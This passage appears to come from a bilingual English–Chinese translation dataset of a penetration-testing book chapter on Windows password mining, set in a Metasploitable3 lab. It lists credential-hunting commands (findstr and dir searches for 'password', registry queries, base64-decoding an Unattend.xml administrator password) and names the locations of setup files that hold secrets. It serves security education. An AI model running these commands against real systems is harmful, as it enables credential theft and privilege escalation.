- en: '*Chapter 7*: Windows Password Mining'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第7章*：Windows 密码挖掘'
- en: An important privilege escalation attack vector that usually goes unexplored
    is the process of searching for locally stored credentials on the target system.
    This process involves searching for specific passwords and password hashes that
    can then be used to elevate privileges directly, without the use of any exploits.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 一个通常未被探索的重要特权提升攻击向量是搜索目标系统上本地存储的凭证的过程。这个过程包括搜索特定的密码和密码哈希值，这些可以直接用于提升特权，而无需使用任何漏洞利用。
- en: This chapter will focus on the process of searching for passwords and dumping
    password hashes on the target system by using various utilities and techniques.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将重点讲解如何使用各种工具和技术在目标系统上搜索密码并导出密码哈希值的过程。
- en: We will also take a look at how Windows **NT LAN Manager** (**NTLM**) hashes
    can be cracked and utilized to elevate privileges on a target system.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还将了解如何破解 Windows **NT LAN Manager**（**NTLM**）哈希值，并利用这些哈希值在目标系统上提升特权。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下主要内容：
- en: What is password mining?
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 什么是密码挖掘？
- en: Searching for passwords in files
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在文件中搜索密码
- en: Searching for passwords in Windows configuration files
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在 Windows 配置文件中搜索密码
- en: Searching for application passwords
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 搜索应用程序密码
- en: Dumping Windows hashes
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 导出 Windows 哈希值
- en: Cracking Windows hashes
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 破解 Windows 哈希值
- en: Technical requirements
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: To follow along with the demonstrations in this chapter, you will need to ensure
    that you are familiar with Windows CMD commands.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 为了跟随本章中的演示，你需要确保熟悉 Windows CMD 命令。
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3ogOyCN](https://bit.ly/3ogOyCN)'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在此查看本章代码的演示：[https://bit.ly/3ogOyCN](https://bit.ly/3ogOyCN)
- en: What is password mining?
  id: totrans-14
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是密码挖掘？
- en: '**Password mining** is the process of searching for and enumerating encrypted
    or cleartext passwords stored in persistent or volatile memory on the target system.
    The primary objective of this process involves identifying potentially useful
    user accounts and application passwords, which can then expand our authority over
    a target system and potentially provide us with elevated privileges.'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: '**密码挖掘**是搜索并列举存储在目标系统的持久性或易失性内存中的加密或明文密码的过程。这个过程的主要目标是识别潜在有用的用户帐户和应用程序密码，然后可以利用这些信息扩展我们对目标系统的控制权限，并可能为我们提供提升的特权。'
- en: Given the nature of Windows configurations and deployment use cases, this process
    will differ from target to target. Therefore, it is important to have a good understanding
    of how and where passwords, both encrypted and cleartext, are stored on Windows.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 由于 Windows 配置和部署用例的性质，这个过程会因目标而异。因此，了解密码（包括加密密码和明文密码）在 Windows 系统中的存储方式和存储位置非常重要。
- en: It is also important to understand that this process relies on a series of vulnerabilities
    that are a result of an organization's or individual's password security practices.
    Poor password security practices are the primary target for attackers as they
    provide a straightforward access vector, without the need for further system exploitation
    or compromise.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 还需要理解的是，这个过程依赖于一系列漏洞，这些漏洞通常源于组织或个人的密码安全实践。差劲的密码安全实践是攻击者的主要目标，因为它们提供了一个直接的访问通道，无需进一步的系统利用或破坏。
- en: Because of the amount of credentials that are required by various platforms
    and applications, employees and individuals are prone to saving their credentials
    on their systems in cleartext, usually in **.doc**, **.txt**, or **.xlsx** files
    for ease of access, and are more likely to use weaker passwords that comprise
    events, names, or dates that are relevant to them. This is a significant threat
    to the security of an organization and as a result, most organizations enforce
    a password security policy as a means of remediating these issues.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 由于各种平台和应用程序需要大量凭证，员工和个人倾向于将凭证以明文形式保存在他们的系统中，通常保存在 **.doc**、**.txt** 或 **.xlsx**
    文件中以便于访问，并且更可能使用较弱的密码，这些密码通常与他们相关的事件、名字或日期相关。这对组织的安全构成了重大威胁，因此大多数组织都会强制执行密码安全政策，以解决这些问题。
- en: Password security policies are used to establish a baseline security level for
    user account passwords and enforce the secure storage and use of stronger passwords
    that comprise words (both uppercase and lowercase), symbols, and numbers with
    a recommended minimum length of 8 digits. However, this gives rise to the occurrence
    of password reuse, where employees and individuals are likely to reuse the same
    password for multiple accounts, primarily because of the complex nature of the
    passwords they are required to use. This allows attackers to gain access to multiple
    accounts by compromising a single password.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 密码安全策略用于建立用户账户密码的基本安全级别，并强制要求安全存储和使用更强的密码，这些密码应包含字母（大写和小写）、符号和数字，且建议最短长度为 8
    位。然而，这也导致了密码重用现象的出现，员工和个人可能会将相同的密码用于多个账户，主要是因为他们需要使用的密码复杂。这使得攻击者可以通过破解一个密码访问多个账户。
- en: An additional security vulnerability or risk involves Windows user account passwords
    and how they are stored. Windows encrypts and stores user account passwords locally
    and in memory. After initial access has been obtained by an attacker, user account
    hashes can be dumped from memory and can be cracked, depending on the length and
    strength of the password. We will explore the advantages and drawbacks of this
    technique later in this chapter.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个安全漏洞或风险涉及 Windows 用户账户密码及其存储方式。Windows 会加密并本地存储用户账户密码以及存储在内存中的密码。在攻击者获得初步访问后，用户账户的哈希值可以从内存中提取，并可以被破解，这取决于密码的长度和强度。我们将在本章后续部分探讨这种技术的优缺点。
- en: From an organizational standpoint, Windows is also used to host third-party,
    business-critical applications that come with their own security vulnerabilities.
    Most of these applications implement some form of access control and, consequently,
    require user authentication in the form of a username and password combination.
    These applications are also prone to storing credentials locally in either cleartext
    or in encrypted format. After successfully exploiting an application, attackers
    can locate these credentials, decrypt them (if they're weak), and use them to
    gain access to the application and, consequently, expand their domain of control
    over a system or network.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 从组织角度来看，Windows 还用于托管第三方的关键业务应用程序，这些应用程序自身也存在安全漏洞。大多数这些应用程序都实现了某种形式的访问控制，因此需要以用户名和密码组合的形式进行用户身份验证。这些应用程序也容易将凭据本地存储，以明文或加密格式保存。攻击者成功利用应用程序后，可以找到这些凭据，解密它们（如果密码较弱），并利用它们访问应用程序，从而扩大对系统或网络的控制范围。
- en: In this chapter, we will be using the Metasploitable3 target virtual machine
    that we set up in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030),
    *Setting Up Our Lab*.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将使用在 [*第 2 章*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030) *设置我们的实验室*
    中设置的 Metasploitable3 目标虚拟机。
- en: Metasploitable3 is an intentionally vulnerable virtual machine that runs on
    **Windows Server 2008 R2** and hosts a plethora of applications, from web apps
    to databases.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploitable3 是一台故意设置漏洞的虚拟机，运行在 **Windows Server 2008 R2** 上，并托管了大量应用程序，从
    Web 应用到数据库。
- en: This robust configuration of applications provides a great real-world scenario
    for a practical demonstration of the tools and techniques that we will be using
    in this chapter.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 这个强大的应用配置提供了一个很好的现实场景，可以用来实际演示我们将在本章中使用的工具和技术。
- en: Before we begin, ensure that you have a foothold of the target system and have
    access through a command shell or meterpreter session.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始之前，请确保你已经掌握了目标系统并能够通过命令行或 Meterpreter 会话进行访问。
- en: The techniques and tools that will be used in this chapter will involve utilizing
    native Windows commands and specific meterpreter modules, to help automate various
    aspects of the password mining and dumping process.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 本章中将使用的技术和工具包括利用 Windows 原生命令和特定的 Meterpreter 模块，帮助自动化密码挖掘和转储过程的各个方面。
- en: Searching for passwords in files
  id: totrans-27
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在文件中搜索密码
- en: The first step of this process involves searching for passwords in various files
    stored locally. This will allow us to identify any user or application passwords
    in text or configuration files. This can be achieved by using built-in Windows
    utilities that allow us to search for specific strings in files with specific
    extensions.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 该过程的第一步是搜索存储在本地的各种文件中的密码。这将帮助我们识别文本或配置文件中的任何用户或应用程序密码。可以通过使用 Windows 内置的实用程序来实现，这些工具可以帮助我们搜索具有特定扩展名的文件中的特定字符串。
- en: 'We will begin this process by following the different procedures outlined here:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将通过以下不同的程序开始这一过程：
- en: 'The first step involves searching the local filesystem for a specific string.
    In this case, the string we will be searching for is **password**. This will enumerate
    all occurrences of the string, their values, and their respective filenames and
    locations. This can be done by running the **findstr** utility in the Windows
    command shell:'
  id: totrans-30
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 第一步是搜索本地文件系统中的特定字符串。在本例中，我们要搜索的字符串是**password**。这将列出该字符串的所有出现位置、其值、对应的文件名及其位置。可以通过在
    Windows 命令行中运行**findstr**工具来实现：
- en: '**findstr /si password *.txt**'
  id: totrans-31
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**findstr /si password *.txt**'
- en: This command will perform a case-sensitive search for the **password** string
    in all subdirectories.
  id: totrans-32
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该命令将执行区分大小写的搜索，查找所有子目录中的**password**字符串。
- en: Note
  id: totrans-33
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: '**findstr** is a Windows utility that is used to search for strings in files
    and can be used in conjunction with various regular expressions to fine tune your
    searches.'
  id: totrans-34
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**findstr**是一个用于在文件中搜索字符串的 Windows 工具，可以与各种正则表达式结合使用，以微调你的搜索。'
- en: To perform a thorough search, it is recommended to run the **findstr** utility
    at the root of the Windows filesystem. This can be done by navigating to the **C:\\**
    directory and initiating the search from there.
  id: totrans-35
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 为了执行彻底的搜索，建议在 Windows 文件系统的根目录运行**findstr**工具。可以通过导航到**C:\\**目录并从那里开始搜索来实现。
- en: 'This will output a list of all **.txt** files that contain the **password**
    string, as illustrated in the following screenshot:'
  id: totrans-36
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将输出所有包含**password**字符串的**.txt**文件列表，如下所示的屏幕截图所示：
- en: '![Figure 7.1 – findstr results'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.1 – findstr 结果'
- en: '](Images/B17389_07_001.jpg)'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_001.jpg)'
- en: Figure 7.1 – findstr results
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.1 – findstr 结果
- en: The command will output a lot of information based on the configuration of the
    system and the number of applications that have been installed. As a result, it
    is recommended to output the results to a file for in-depth analysis as the results
    can be tedious to analyze manually.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 根据系统配置和已安装的应用程序数量，该命令将输出大量信息。因此，建议将结果输出到文件中进行深入分析，因为手动分析结果可能会非常繁琐。
- en: 'We can also use the **findstr** utility to search for the **password** string
    in ***.xml** files. This can be done by running the following command:'
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们还可以使用**findstr**工具在***.xml**文件中搜索**password**字符串。可以通过运行以下命令来实现：
- en: '**findstr /si password *.xml**'
  id: totrans-42
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**findstr /si password *.xml**'
- en: As shown in the following screenshot, this will output a list of all occurrences
    of the **password** string in **.xml** files.
  id: totrans-43
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下所示，这将输出所有**.xml**文件中**password**字符串的出现位置列表。
- en: 'You can also fine-tune your search to limit the results to the files that contain
    occurrences of the string by running the following command:'
  id: totrans-44
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 你还可以通过运行以下命令来微调搜索，限制结果仅显示包含字符串的文件：
- en: '**findstr /si /m "password" *.xml *.ini *.txt**'
  id: totrans-45
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**findstr /si /m "password" *.xml *.ini *.txt**'
- en: 'This will limit the output of the search to the files that have the string
    specified in the search query:'
  id: totrans-46
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将限制搜索输出，仅显示包含搜索查询中指定字符串的文件：
- en: '![Figure 7.2 – finstr XML results'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.2 – findstr XML 结果'
- en: '](Images/B17389_07_002.jpg)'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_002.jpg)'
- en: Figure 7.2 – finstr XML results
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.2 – findstr XML 结果
- en: 'We can also perform a comprehensive search for a specific string in all the
    files and directories on the target system. This can be done by running the following
    command:'
  id: totrans-50
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们还可以对目标系统中所有文件和目录进行综合搜索，查找特定字符串。可以通过运行以下命令来实现：
- en: '**findstr /spin "password" *.* -**'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**findstr /spin "password" *.* -**'
- en: This command will output all files, regardless of their formats or extensions,
    that have occurrences of the **password** string within them.
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该命令将输出所有文件，无论其格式或扩展名，只要文件中包含**password**字符串。
- en: Based on the deployment use case of the target, you may receive a lot of matches
    for the **password** string or none at all. We will take a closer look at how
    to fine-tune our searches based on the type of password we are looking for in
    the next section.
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 根据目标的部署用例，你可能会收到很多匹配项，或者完全没有匹配项。我们将在下一节中详细介绍如何根据我们寻找的密码类型来微调搜索。
- en: 'We can also search for various strings in files by using the **dir** command
    on Windows. This can be done by running the following command:'
  id: totrans-54
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们还可以通过在 Windows 上使用**dir**命令在文件中搜索各种字符串。可以通过运行以下命令来实现：
- en: '**dir /s *pass* == *cred* == *vnc* == *.config***'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**dir /s *pass* == *cred* == *vnc* == *.config***'
- en: 'As shown in the following screenshot, the command will output all occurrences
    of the strings specified and their respective locations. This particular scan
    is much more comprehensive and has a higher probability of returning useful and
    actionable results:'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，该命令将输出指定字符串的所有出现及其相应的位置。这种扫描更加全面，并具有更高的返回有用和可操作结果的概率：
- en: '![Figure 7.3 – Directory search results'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.3 – 目录搜索结果'
- en: '](Images/B17389_07_003.jpg)'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_003.jpg)'
- en: Figure 7.3 – Directory search results
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.3 – 目录搜索结果
- en: As highlighted in the preceding screenshot, the search reveals the location
    of files that contain the strings specified in the search. In this particular
    case, we can identify the location of the local and domain passwords for the **GlassFish**
    server. We can use these credentials to take control of the service.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的屏幕截图所示，搜索显示了包含搜索中指定字符串的文件的位置。在这种特定情况下，我们可以识别出**GlassFish**服务器的本地和域密码的位置。我们可以使用这些凭据控制该服务。
- en: We will take a closer look at how to search for application-specific passwords
    in the upcoming sections and how they can be used to elevate our privileges.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 在接下来的章节中，我们将详细介绍如何搜索特定于应用程序的密码及其如何用于提升我们的权限。
- en: Now that we know how to search for useful strings in files on the target system,
    we will take a look at how to search for passwords in Windows configuration files.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道如何在目标系统的文件中搜索有用的字符串，接下来我们将看看如何在Windows配置文件中搜索密码。
- en: Searching for passwords in Windows configuration files
  id: totrans-63
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在Windows配置文件中搜索密码
- en: Windows can automate a variety of repetitive tasks, such as the mass rollout
    or installation of Windows on many systems. An example of this is the **Unattended
    Windows Setup** utility, which automates the mass installation of Windows. This
    tool utilizes configuration files that contain specific configurations and user
    account credentials that can be used by attackers to elevate privileges. In this
    section, we will be taking a look at how to search for and identify the configuration
    files that are used during the Unattended Windows Setup process.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: Windows可以自动化各种重复的任务，例如在多个系统上大规模部署或安装Windows。其中一个示例是**无人值守Windows安装**实用程序，它自动化了Windows的大规模安装。此工具利用包含特定配置和用户账户凭据的配置文件，攻击者可以利用这些凭据提升权限。在本节中，我们将探讨如何搜索和识别在无人值守Windows安装过程中使用的配置文件。
- en: It is important to note that this technique will vary based on the version of
    Windows being use, as well as whether Windows was installed using the Unattended
    Windows Setup utility. Given the typical use case of the Unattended Windows Setup
    utility, this method will be useful when it's employed in an organization-specific
    environment. However, you may run into individual systems that utilize the Unattended
    Windows Setup utility.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 需要注意的是，此技术将根据所使用的Windows版本以及是否使用了无人值守Windows安装工具而有所不同。鉴于无人值守Windows安装工具的典型用例，当它在特定于组织的环境中使用时，此方法将非常有用。但是，您可能会遇到使用无人值守Windows安装工具的个别系统。
- en: 'In our case, our target system was not set up and configured using the Unattended
    Windows Setup utility, so the following techniques will not be directly applicable.
    However, it is a vitally important aspect of the password mining process:'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的案例中，我们的目标系统并未使用无人值守Windows安装工具进行设置和配置，因此以下技术将不直接适用。但是，这是密码挖掘过程中的一个至关重要的方面：
- en: 'The first step involves searching for and identifying the Unattended Windows
    Setup configuration files that were left over. The names of the configuration
    file will vary based on the version of Windows that''s been installed. The file
    typically has one of the following names:'
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步是搜索并识别剩余的无人值守Windows安装配置文件。配置文件的名称会根据已安装的Windows版本而异。该文件通常具有以下名称之一：
- en: '- **Unattend.xml**'
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **Unattend.xml**'
- en: '- **Autounattend.xml**'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **Autounattend.xml**'
- en: 'The location of the configuration file will also depend on the version of Windows
    that''s been installed and can typically be found in one of the following locations:'
  id: totrans-70
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 配置文件的位置也取决于已安装的Windows版本，并且通常可以在以下位置之一找到：
- en: C:\\Windows\Panther\Unattend\Unattended.xml
  id: totrans-71
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: C:\\Windows\Panther\Unattend\Unattended.xml
- en: C:\\Windows\Panther\Unattdended.xml
  id: totrans-72
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: C:\\Windows\Panther\Unattdended.xml
- en: 'As highlighted in the following Terminal output, if the configuration file
    exists, it should contain the **Administrator** password in cleartext or encoded
    in Base64 so that it can be decrypted to reveal the cleartext password:'
  id: totrans-73
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下终端输出所示，如果配置文件存在，它应该包含**管理员**密码的明文或以 Base64 编码的密码，经过解码后即可揭示明文密码：
- en: '**<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35"
    language="neutral" versionScope="nonSxS" processorArchitecture="amd64">**'
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35"
    language="neutral" versionScope="nonSxS" processorArchitecture="amd64">**'
- en: '**    <AutoLogon>**'
  id: totrans-75
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**    <AutoLogon>**'
- en: '**     <Password>UGFzc3dvcmQxMjM=</Password>**'
  id: totrans-76
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**     <Password>UGFzc3dvcmQxMjM=</Password>**'
- en: '**     <Enabled>true</Enabled>**'
  id: totrans-77
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**     <Enabled>true</Enabled>**'
- en: '**     <Username>Administrator</Username>**'
  id: totrans-78
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**     <Username>Administrator</Username>**'
- en: '**    </AutoLogon>**'
  id: totrans-79
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**    </AutoLogon>**'
- en: '**    <UserAccounts>**'
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**    <UserAccounts>**'
- en: '**     <LocalAccounts>**'
  id: totrans-81
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**     <LocalAccounts>**'
- en: '**      <LocalAccount wcm:action="add">**'
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**      <LocalAccount wcm:action="add">**'
- en: '**       <Password>*SENSITIVE*DATA*DELETED*</Password>**'
  id: totrans-83
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**       <Password>*SENSITIVE*DATA*DELETED*</Password>**'
- en: '**       <Group>administrators;users</Group>**'
  id: totrans-84
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**       <Group>administrators;users</Group>**'
- en: '**       <Name>Administrator</Name>**'
  id: totrans-85
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**       <Name>Administrator</Name>**'
- en: '**      </LocalAccount>**'
  id: totrans-86
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**      </LocalAccount>**'
- en: '**     </LocalAccounts>**'
  id: totrans-87
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**     </LocalAccounts>**'
- en: '**    </UserAccounts>**'
  id: totrans-88
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**    </UserAccounts>**'
- en: 'The encrypted password can be decrypted using the built-in base64 utility on
    Kali Linux. This can be done by running the following command:'
  id: totrans-89
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 使用 Kali Linux 上的内置 base64 工具可以解密加密密码。可以通过运行以下命令来完成：
- en: '**echo "<ENCRYPTED-PASSWORD>" | base64 -d**'
  id: totrans-90
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**echo "<ENCRYPTED-PASSWORD>" | base64 -d**'
- en: Windows installations can also be automated using a Windows utility called **Sysprep**.
    Sysprep is used to deploy Windows images to different systems and can also be
    used in conjunction with the Windows Unattended Setup utility to prepare the image
    for deployment.
  id: totrans-91
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Windows 安装也可以通过名为 **Sysprep** 的 Windows 工具进行自动化。Sysprep 用于将 Windows 镜像部署到不同的系统，并且也可以与
    Windows 无人值守安装工具配合使用，来为镜像的部署做好准备。
- en: 'Similarly, **Sysprep** also utilizes configuration files that contain customizations
    and user credentials. If these files are not cleaned up, they can reveal useful
    credentials. The name of the configuration file will vary based on the version
    of Windows that''s been installed. The file typically has one of the following
    names:'
  id: totrans-92
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 同样，**Sysprep** 也利用包含定制内容和用户凭据的配置文件。如果这些文件没有被清理，它们可能会泄露有用的凭据信息。配置文件的名称会根据安装的
    Windows 版本有所不同。该文件通常具有以下名称之一：
- en: '- **Sysprep.inf**'
  id: totrans-93
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **Sysprep.inf**'
- en: '- **Sysprep.xml**'
  id: totrans-94
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **Sysprep.xml**'
- en: 'The location of the configuration file will also depend on the version of Windows
    that''s been installed and can typically be found under one of the following locations:'
  id: totrans-95
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 配置文件的位置还取决于安装的 Windows 版本，通常可以在以下位置找到：
- en: C:\\sysprep.inf
  id: totrans-96
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: C:\\sysprep.inf
- en: C:\\sysprep\sysprep.xml
  id: totrans-97
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: C:\\sysprep\sysprep.xml
- en: 'As highlighted in the following screenshot, If the configuration file exists,
    it should contain the administrator password in cleartext:'
  id: totrans-98
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，如果配置文件存在，它应该包含明文的管理员密码：
- en: '![Figure 7.4 – Sysprep.xml password'
  id: totrans-99
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 7.4 – Sysprep.xml 密码](Images/B17389_07_004.jpg)'
- en: '](Images/B17389_07_004.jpg)'
  id: totrans-100
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_004.jpg)'
- en: Figure 7.4 – Sysprep.xml password
  id: totrans-101
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.4 – Sysprep.xml 密码
- en: If these configuration files exist, they offer a straightforward path to authenticate
    to the system as the admin user attains elevated privileges.
  id: totrans-102
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果这些配置文件存在，它们提供了一条直接的路径，可以在管理员用户获得提升的权限后进行系统身份验证。
- en: 'The next point of interest in Windows is its registry. The Windows Registry
    is a database that is responsible for storing settings and configurations for
    Windows and other applications installed on the system. We can search the registry
    for specific strings to reveal user credentials. This can be done by running the
    following commands:'
  id: totrans-103
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Windows 中另一个重要的部分是注册表。Windows 注册表是一个数据库，负责存储 Windows 系统及其他安装在系统中的应用程序的设置和配置。我们可以搜索注册表中的特定字符串来揭示用户凭据。这可以通过运行以下命令来完成：
- en: '**reg query HKLM /f password /t REG_SZ /s**'
  id: totrans-104
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**reg query HKLM /f password /t REG_SZ /s**'
- en: '**reg query HKCU /f password /t REG_SZ /s**'
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**reg query HKCU /f password /t REG_SZ /s**'
- en: 'As highlighted in the following screenshot, this will output all the registry
    entries that match the **password** string:'
  id: totrans-106
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，这将输出所有匹配**密码**字符串的注册表项：
- en: '![Figure 7.5 – Windows Registry search](Images/B17389_07_005.jpg)'
  id: totrans-107
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.5 – Windows 注册表搜索](Images/B17389_07_005.jpg)'
- en: Figure 7.5 – Windows Registry search
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.5 – Windows 注册表搜索
- en: In this particular case, we did not find anything of interest. As a result,
    we will now turn our attention to finding and enumerating application-specific
    passwords.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个特定案例中，我们没有发现任何有趣的内容。因此，我们将转向查找和枚举特定于应用程序的密码。
- en: Searching for application passwords
  id: totrans-110
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 搜索应用程序密码
- en: Applications are an enticing target for attackers when they have weaknesses
    and vulnerabilities in them. How they store credentials can lead to complete system
    compromise or elevated privileges.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 当应用程序存在漏洞和弱点时，它们成为攻击者的诱人目标。它们如何存储凭证可能导致系统完全被攻破或权限提升。
- en: This section will focus on finding and enumerating application credentials.
    The techniques demonstrated in this section will depend on the type of target
    you are dealing with and its deployment use case. In our particular case, our
    target virtual machine has been set up as a server and has various applications
    installed on it.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 本节将重点介绍如何查找和枚举应用程序凭证。本节演示的技术将取决于你所处理的目标类型以及其部署使用场景。在我们的特定案例中，目标虚拟机被设置为服务器，并安装了各种应用程序。
- en: 'In [*Chapter 3*](B17389_03_Final_PG_ePub.xhtml#_idTextAnchor045), *Gaining
    Access (Exploitation)*, we performed a comprehensive Nmap scan on our target and
    identified several applications, most of which were web applications that utilize
    some form of authentication. These are some of the applications we can target:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 在 [*第 3 章*](B17389_03_Final_PG_ePub.xhtml#_idTextAnchor045)，*获取访问权限（利用）* 中，我们对目标进行了全面的
